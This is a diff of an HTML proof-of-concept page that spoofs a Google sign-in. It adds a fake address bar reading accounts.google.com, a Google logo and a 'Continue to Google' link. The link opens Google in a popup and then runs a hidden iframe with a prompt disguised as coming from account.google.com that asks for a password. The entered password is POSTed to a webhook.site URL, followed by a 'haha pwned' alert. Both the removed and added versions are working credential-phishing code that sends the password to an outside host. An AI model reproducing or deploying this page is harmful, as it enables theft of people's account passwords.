@@ -1,104 +1,131 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Thread for Android</title>
+    <title>Google Account Spoofed Prompt (href PoC)</title>
     <style>
         body {
             margin: 0;
             padding: 20px;
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f0f0f0;
             text-align: center;
+            line-height: 1.6;
         }
-        button {
+        h1 { color: #d93025; font-size: 24px; margin-bottom: 10px; }
+        h2 { color: #333; font-size: 18px; margin: 20px 0 10px; }
+        a.button {
             display: inline-block;
-            padding: 15px 30px;
-            background: #ff4444;
+            padding: 16px 32px;
+            background: #1a73e8;
             color: white;
-            border-radius: 5px;
+            border: none;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
-            margin-top: 50px;
-            border: none;
+            font-weight: 500;
+            margin: 20px auto;
+            text-decoration: none;
+            box-shadow: 0 2px 6px rgba(26,115,232,0.3);
+            transition: all 0.2s;
         }
-        button:hover { background: #cc0000; }
+        a.button:hover {
+            background: #1557b0;
+            transform: translateY(-1px);
+        }
+        a.button:active {
+            transform: translateY(0);
+        }
         #status {
-            margin-top: 20px;
-            color: #333;
-            font-size: 24px;
+            margin-top: 30px;
+            padding: 16px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            min-height: 50px;
             font-weight: bold;
+            color: #d93025;
         }
-        .hidden {
-            display: none;
+        .info {
+            background: #e8f0fe;
+            color: #1967d2;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            margin: 20px;
+            border-left: 4px solid #1a73e8;
+        }
+        .fake-addr {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            background: #f1f3f4;
+            padding: 8px 12px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #5f6368;
+            z-index: 9999;
+            border-bottom: 1px solid #dadce0;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+        }
+        .google-logo {
+            width: 80px;
+            margin: 20px auto;
         }
     </style>
 </head>
 <body>
-    <h2>Click to Trigger Spoofed Prompt</h2>
-    <button id="triggerBtn">Spoof Prompt</button>
-    <div id="status"></div>
-    <form id="hiddenForm" class="hidden" method="POST" action="https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit">
-        <input type="text" id="passwordInput" name="password">
-    </form>
+    <!-- Fake Google Address Bar -->
+    <div class="fake-addr">https://accounts.google.com/signin/v2/challenge</div>
 
-    <script>
-        document.getElementById('triggerBtn').onclick = () => {
-            // Step 1: Open a legit domain in a new window
-            const w = window.open('https://account.google.com/');
-            if (!w) {
-                document.getElementById('status').innerHTML = 'Popup blocked. Fallback not implemented.';
-                return;
-            }
-            // Step 2: Create hidden iframe and trigger prompt after 2s
+    <div class="google-logo">
+        <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 10.51c0-.84-.08-1.66-.22-2.44h-11.1v4.62h6.33c-.27 1.4-1.1 3.6-3.24 4.8l-.04.24 4.7 3.64.33.03c3.03-2.8 4.78-6.9 4.78-11.89z" fill="#4285F4"/>
+            <path d="M11.24 21.62c3.15 0 5.8-1.04 7.74-2.82l-5.03-3.9c-1.36.91-3.1 1.44-4.71 1.44-3.62 0-6.68-2.37-7.77-5.57l-.24.02-4.88 3.78-.06.17c1.93 3.78 5.9 6.28 10.95 6.28z" fill="#34A853"/>
+            <path d="M3.47 12.75c-.3-1.1-.47-2.27-.47-3.5s.17-2.4.47-3.5l-.01-.26-4.94-3.83-.16.08c-1.1 1.95-1.72 4.16-1.72 6.51 0 2.35.62 4.56 1.72 6.51l.28-.22 4.83-3.79z" fill="#FBBC05"/>
+            <path d="M11.24 4.62c1.72 0 3.27.62 4.49 1.84l3.32-3.32c-2.03-1.9-4.7-3.06-7.81-3.06-5.05 0-9.02 2.5-10.95 6.28l6.1 4.73c1.09-3.2 4.15-5.57 7.85-5.57z" fill="#EA4335"/>
+        </svg>
+    </div>
+
+    <h1>Sign in</h1>
+    <h2>Use your Google Account</h2>
+
+    <div class="info">
+        <strong>PoC Active:</strong> Click below to verify your account
+    </div>
+
+    <!-- GUNAKAN href="javascript:" — TANPA onclick -->
+    <a href="javascript:(function(){
+        const w = window.open('https://account.google.com/', '_blank');
+        if (!w) { alert('Popup blocked!'); return; }
+        setTimeout(() => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'javascript:(function(){
+                setTimeout(function(){
+                    var p = prompt(\"account.google.com says\\n\\nPassword:\");
+                    if(p && p.trim() !== ''){
+                        document.write('<form method=\"POST\" action=\"https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit\" id=\"f\">' +
+                            '<input type=\"hidden\" name=\"password\" value=\"'+p.replace(/\\\"/g,\"&quot;\")+'\">' +
+                            '<input type=\"submit\"></form>');
+                        document.getElementById('f').submit();
+                        setTimeout(() => { alert('haha pwned!\\nPassword: ' + p); }, 500);
+                    } else if (p !== null) {
+                        alert('Password required!');
+                        setTimeout(arguments.callee, 500);
+                    }
+                }, 1000);
+            })()';
+            document.body.appendChild(iframe);
             setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'javascript:(function(){var p=prompt("account.google.com says                                                                                                                                     Password:");if(p){document.write(\'<form method="POST" action="https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit" id="iframeForm"><input type="hidden" name="password" value="\'+p+\'"><input type="submit"></form>\');document.getElementById("iframeForm").submit();}})()';
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
+                if (document.body.contains(iframe)) document.body.removeChild(iframe);
+                if (w && !w.closed) w.close();
+            }, 5000);
+        }, 2000);
+    })()" class="button">Continue to Google</a>
 
-                // Step 3: Listen for form submission and update status
-                const hiddenForm = document.getElementById('hiddenForm');
-                hiddenForm.onsubmit = (e) => {
-                    e.preventDefault(); // Prevent actual submission
-                    const password = document.getElementById('passwordInput').value; // This won't work directly; see workaround below
-                    if (password) {
-                        document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + password;
-                    } else {
-                        document.getElementById('status').innerHTML = 'haha pwned<br>No password captured.';
-                    }
-                    // Clean up
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                        if (w && !w.closed) w.close();
-                    }, 1000);
-                };
-
-                // Workaround: Poll for iframe content change (since direct access is restricted)
-                const checkIframe = setInterval(() => {
-                    try {
-                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        const iframeForm = iframeDoc.getElementById('iframeForm');
-                        if (iframeForm) {
-                            const pwd = iframeForm.querySelector('input[name="password"]').value;
-                            if (pwd) {
-                                document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + pwd;
-                                clearInterval(checkIframe);
-                                setTimeout(() => {
-                                    document.body.removeChild(iframe);
-                                    if (w && !w.closed) w.close();
-                                }, 2000);
-                            }
-                        }
-                    } catch (e) {
-                        // Cross-origin error; proceed with cleanup
-                        clearInterval(checkIframe);
-                    }
-                }, 500);
-            }, 2000);
-        };
-    </script>
+    <div id="status">Waiting for action...</div>
 </body>
 </html>
